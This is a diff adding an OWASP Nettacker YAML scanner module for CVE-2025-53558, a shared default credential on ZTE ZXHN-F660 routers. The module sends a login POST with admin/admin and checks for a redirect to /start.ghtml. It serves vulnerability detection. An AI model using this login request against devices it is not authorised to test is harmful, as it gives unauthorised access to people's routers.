@@ -1,0 +1,59 @@
+info:
+  name: zte_zxhn_f660_cve_2025_53558_vuln
+  author: OWASP Nettacker Team
+  severity: 8.7
+  description:  ZXHN-F660T and ZXHN-F660A provided by ZTE Japan K.K. use a common credential for all installations. With the knowledge of the credential, an attacker may log in to the affected devices.
+  reference: 
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-53558
+    - https://jvn.jp/en/jp/JVN66546573/
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve2025
+    - default_login
+    - zte
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 5
+        allow_redirects: false
+        ssl: false
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: application/x-www-form-urlencoded"
+
+        body: |
+          frashnum=&action=login&Frm_Logintoken=0&Username=admin&Password=admin
+
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors: []
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              paths:
+                - "/"
+
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "302"
+              reverse: false
+            headers:
+              Location:
+                regex: "/start.ghtml"
+                reverse: false
+            content:
+              regex: "wrong username|User information is error"
+              reverse: true
